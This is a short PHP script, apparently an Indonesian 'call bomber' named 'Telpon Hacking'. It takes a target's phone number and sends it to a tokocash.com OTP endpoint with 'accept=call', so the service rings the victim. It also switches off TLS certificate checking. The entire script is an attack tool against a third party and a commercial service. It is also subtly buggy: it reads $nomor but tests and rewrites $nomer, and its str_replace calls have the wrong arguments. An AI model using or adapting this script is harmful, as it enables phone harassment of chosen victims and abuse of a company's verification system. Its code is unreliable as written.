<?php
// Limit 3x Telpon Setiap Satu Nomor
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
{
echo "Welcome To Telpon Hacking\n";
echo "input Your Number using +62\n";
}
echo "[?].Input Nomor : ";
$nomor = trim(fgets(STDIN));
if(strlen($nomer)==11){
	$nomor = str_replace("0","62".$nomer);
}elseif(strlen($nomer)>12){
	$nomor = str_replace("62","0",$nomer);
}
echo "\33[32;1mTarget: \33[31;1m$nomor \33[32;1m(y/n)";
$cek = trim(fgets(STDIN));
if($cek=="n") exit("\33[31;1mStopped!\n");
echo "\33[31;1m[!]\33[37;1mMemanggil... \33[31;1m[$nomor]";
sleep(10);
$execute = send($nomor);
print $execute;
sleep(5);
?>